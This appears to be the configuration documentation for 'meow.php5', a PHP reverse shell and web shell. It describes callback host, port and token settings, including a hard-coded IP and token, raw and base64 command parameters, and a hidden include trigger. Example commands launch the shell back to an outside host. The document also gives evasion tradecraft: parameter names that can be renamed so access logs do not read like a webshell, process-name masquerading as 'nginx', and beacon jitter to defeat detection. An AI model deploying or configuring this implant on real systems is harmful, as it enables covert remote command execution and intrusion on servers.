# Configuration

This document describes all supported configuration options in `meow.php5` (v2.1), based strictly on reading the source code.

## Configuration precedence

Each setting is resolved from three sources, in increasing precedence:

1. **Default value** — in the config array at the end of `meow.php5`
2. **CLI argument** — positional (`host`, `port`, `token`) or flag (`--tls`, `--no-tls`, etc.)
3. **Environment variable** — `MEOW_<UPPERCASE_KEY>` for each config key

Boolean env values are interpreted as `($env !== '0')`; string env values are used as-is.

## CLI usage

```
php meow.php5 [host] [port] [token] \
    [--tls|--no-tls] [--no-retry] [--no-pty] [--quiet] \
    [--timeout=<secs>] [--delay=<secs>] \
    [--alias=<name>] [--jitter=<0..1>]
```

Positional arguments (host, port, token) must appear before any flag beginning with `-`, otherwise a flag could be silently consumed as the token value.

## Configuration reference

| Key | Default | CLI flag | Env var | Type | Description |
|-----|---------|----------|---------|------|-------------|
| `host` | `192.168.173.57` | positional arg 1 | `MEOW_HOST` | string | Callback target host |
| `port` | `6665` | positional arg 2 | `MEOW_PORT` | int | Callback target port |
| `token` | `X82Wd3t0qasJ87D9hUqPXCl5` | positional arg 3 | `MEOW_TOKEN` | string | Session auth token |
| `tls` | `false` | `--tls` / `--no-tls` | `MEOW_TLS` | bool | Enable TLS on the callback |
| `retry` | `true` | `--no-retry` | `MEOW_RETRY` | bool | Reconnect on disconnect |
| `retry_max` | `0` (forever) | — | `MEOW_RETRY_MAX` | int | Max reconnect attempts; 0 = unlimited |
| `retry_delay` | `5` | `--delay=<secs>` | `MEOW_RETRY_DELAY` | int | Base reconnect delay (seconds) |
| `exec_timeout` | `30` | `--timeout=<secs>` | `MEOW_EXEC_TIMEOUT` | int | Wall-clock cap per command; 0 disables |
| `pty` | `true` | `--no-pty` | `MEOW_PTY` | bool | Offer PTY upgrade in session |
| `quiet` | `false` | `--quiet` | `MEOW_QUIET` | bool | Suppress the no-token warning |
| `web` | `true` | — | `MEOW_WEB` | bool | Enable web-shell mode |
| `web_key` | `sid` | — | `MEOW_WEB_KEY` | string | Request param carrying the token |
| `web_cmd` | `c` | — | `MEOW_WEB_CMD` | string | Request param carrying a raw command |
| `web_b64` | `upd` | — | `MEOW_WEB_B64` | string | Request param carrying a base64 command |
| `run_key` | `sid` | — | — | string | Include trigger key |
| `run_val` | `upd` | — | `MEOW_RUN_ON_INCLUDE` | string | Include trigger value / env opt-in |
| `proc_alias` | `''` | `--alias=<name>` | `MEOW_PROC_ALIAS` | string | Process title (e.g., `nginx`) |
| `jitter` | `0` | `--jitter=<0..1>` | `MEOW_JITTER` | float | Beacon jitter fraction (0..1) |
| `version` | `2.1` | — | — | string | Reported version |

> **Note about `web_key`/`web_b64` defaults:** In the source, `web_key` is initially set to `'k'` then overridden to `'sid'`; `web_b64` is initially `'cb'` then overridden to `'upd'`. The final effective defaults are `web_key => 'sid'` and `web_b64 => 'upd'`. `run_key` also defaults to `'sid'` and `run_val` to `'upd'`, so the include trigger (`?sid=upd`) overlaps with the web token parameter by default.

## Environment variable examples

Set callback target and token without editing the file:
```
MEOW_HOST=1.2.3.4 MEOW_PORT=443 MEOW_TOKEN=changeme php meow.php5 --tls
```

Disable reconnection and set a long command timeout:
```
MEOW_RETRY=0 MEOW_EXEC_TIMEOUT=120 php meow.php5 host port token
```

Enable the include trigger via environment:
```
MEOW_RUN_ON_INCLUDE=1
```

## Web shell parameter names

When accessed over HTTP, the web shell reads:

- Token: `$_GET[web_key]` (default `sid`)
- Base64 command: `$_POST[web_b64]` then `$_GET[web_b64]` (default `upd`)
- Raw command: `$_POST[web_cmd]` then `$_GET[web_cmd]` (default `c`)

These names can be changed per engagement so that access logs do not read like a webshell (e.g., `?sid=...&upd=...` vs `?k=...&cb=...`).

## Include trigger

When `include`d by another script, no side effects occur unless:

- `$_GET[run_key] === run_val` (default: `?sid=upd`), or
- `getenv('MEOW_RUN_ON_INCLUDE')` is truthy

## Security implications of configuration options

| Option | Security implication |
|--------|----------------------|
| `token` | Single shared secret. Anyone who can reach host:port can attempt to drive the shell if the token is known or absent. Use a strong, unique token. |
| `tls` | Encrypts the callback channel but does **not** verify the peer (self-signed accepted). Protects against passive eavesdropping, not active MITM. |
| `retry` / `retry_max` / `retry_delay` | Controls reconnection behavior. `retry_max = 0` means retry forever. |
| `quiet` | Suppresses the stderr warning when no token is set. |
| `web` | Enables the HTTP web-shell entry point. Disable if only CLI reverse shell is needed. |
| `web_key` / `web_b64` / `web_cmd` | Renameable request parameters to reduce visibility in access logs. |
| `proc_alias` | Process-title masquerade. Makes `ps` output show a chosen name. Tradecraft, not stealth. |
| `jitter` | Randomizes callback intervals. Defeats naive fixed-interval beacon detection. |

## Notes

- No configuration file is read; all configuration is in-source, via CLI, or via environment.
- There is no configuration validation beyond port range checks in `!fwd` and jitter clamping to [0,1].
- The `exec_timeout` applies per command via the `timeout` binary (POSIX only); on Windows or without `timeout`, no wall-clock cap is enforced.
- `retry_delay` is used as the base for exponential backoff: `min(60, retry_delay * (1 << min(tries, 4)))`, then jittered.
